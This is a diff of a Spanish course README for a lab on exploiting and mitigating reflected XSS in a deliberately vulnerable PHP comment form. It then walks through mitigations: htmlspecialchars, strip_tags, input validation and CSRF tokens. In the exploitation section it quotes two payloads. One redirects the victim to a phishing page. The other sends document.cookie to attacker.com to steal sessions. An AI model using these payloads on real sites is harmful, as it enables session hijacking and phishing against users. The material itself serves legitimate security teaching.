@@ -1,17 +1,17 @@
 # PPS-Unidad3Actividad5-XSS
 Explotación y Mitigación de Cross-Site Scripting (XSS)
-
+===
 Tenemos como objetivo:
 
-> Recordar cómo se pueden hacer ataques de Cross-Site Scripting (XSS)
+> - Recordar cómo se pueden hacer ataques de Cross-Site Scripting (XSS)
 >
-> Conocer las diferentes formas de ataques XSS.
+> - Conocer las diferentes formas de ataques XSS.
 >
-> Analizar el código de la aplicación que permite ataques de Cross-Site Scripting (XSS)
+> - Analizar el código de la aplicación que permite ataques de Cross-Site Scripting (XSS)
 >
-> Implementar diferentes modificaciones del codigo para aplicar mitigaciones o soluciones.
+> - Implementar diferentes modificaciones del codigo para aplicar mitigaciones o soluciones.
 
-# ¿Qué es XSS?
+## ¿Qué es XSS?
 ---
 Cross-Site Scripting (XSS) ocurre cuando una aplicación no valida ni sanitiza l>
 scripts maliciosos se ejecuten en el navegador de otros usuarios.
@@ -23,12 +23,13 @@ Tipos de XSS:
 
 ---
 ## ACTIVIDADES A REALIZAR
-> Lee el siguiente [documento sobre Explotación y Mitigación de ataques de Inyección SQL](files/ExplotacionYMitigacionXSS.pdf) de Raúl Fuentes. Nos va a seguir de guía para aprender a explotar y mitigar ataques de inyección XSS Reflejado en nuestro entorno de pruebas.
+> Lee el siguiente [documento sobre Explotación y Mitigación de ataques de Inyección SQL](./files/ExplotacionYMitigacionXSS.pdf) de Raúl Fuentes. Nos va a seguir de guía para aprender a explotar y mitigar ataques de inyección XSS Reflejado en nuestro entorno de pruebas.
+> 
 > También y como marco de referencia, tienes [ la sección de correspondiente de ataque XSS reglejado de la **Proyecto Web Security Testing Guide** (WSTG) del proyecto **OWASP**.](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting).
 
 Vamos realizando operaciones:
 
-###**Código vulnerable**
+### Código vulnerable
 ---
 Crear el archivo vulnerable comment.php:
 
@@ -47,9 +48,9 @@ Este código muestra un formulario donde el usuario puede ingresar un comentario
 el usuario envía el formulario, el comentario ingresado se muestra en la pantalla con el mensaje "Comentario publicado:
 \[comentario\]". El Código no sanitiza la entrada del usuario, lo que permite inyectar scripts maliciosos.
 
-![](files/xss1.png)
+![](images/xss1.png)
 
-###**Explotación de XSS**
+### **Explotación de XSS**
 ---
 
 Abrir el navegador y acceder a la aplicación: <http://localhost/comment.php>
@@ -60,24 +61,24 @@ Ingresar el siguiente código en el formulario:
 
 Si aparece un mensaje de alerta (alert()) en el navegador, significa que la aplicación es vulnerable.
 
-![](files/xss2.png)
+![](images/xss2.png)
 
 Podríamos redirigir a una página de phishing:
 
 `<script>window.location='https://fakeupdate.net/win11/'</script>`
 
-![](files/xss3.png)
+![](images/xss3.png)
 
 Podemos capturar cookies del usuario (en ataques reales):
 
 `<script>document.write('<img src="http://attacker.com/steal.php?cookie='+document.cookie+'">')</script>`
 Con esto, un atacante podría robar sesiones de usuarios.
 
-![](files/xss4.png)
+![](images/xss4.png)
 
 ###**Mitigación**
 ---
-** Uso de filter_input() para filtrar caracteres.**
+**Uso de filter_input() para filtrar caracteres.**
 
 Filtra caracteres problemáticos.
 
@@ -140,12 +141,14 @@ if (isset($_POST['comment'])) {
 </form>
 ~~~
 
-![](files/xss5.png)
+![](images/xss5.png)
 
 Aunque usar htmlspecialchars() es una buena medida para prevenir ataques XSS, todavía se puede mejorar la
 seguridad y funcionalidad del código con los siguientes puntos:
 
 **Validación de entrada**
+---
+
 Actualmente, el código permite que el usuario envíe cualquier contenido, incluyendo texto vacío o datos
 demasiado largos. Puedes agregar validaciones para asegurarte de que el comentario sea adecuado:
 
@@ -170,7 +173,8 @@ Evita comentarios vacíos o excesivamente largos (500 caracteres).
 
 ![](files/xss6.png)
 
-** Protección contra inyecciones HTML y JS (XSS)**
+**Protección contra inyecciones HTML y JS (XSS)**
+---
 Si bien htmlspecialchars() mitiga la ejecución de scripts en el navegador, se puede reforzar con strip_tags() si
 solo se quiere texto sin etiquetas HTML:
 `$comment = strip_tags($_POST['comment']);`
@@ -180,7 +184,8 @@ Si en cambio si se quiere permitir algunas etiquetas (por ejemplo, <b> y <i>), s
 `$comment = strip_tags($_POST['comment'], '<b><i>');`
 
 -
-** Protección contra ataques CSRF**
+**Protección contra ataques CSRF**
+---
 Actualmente, cualquiera podría enviar comentarios en el formulario con una solicitud falsa desde otro sitio web.
 Para prevenir esto, se puede generar un token CSRF y verificarlo antes de procesar el comentario.
 En la [proxima actividad sobre ataques CSRF]() lo veremos más detenidamente.
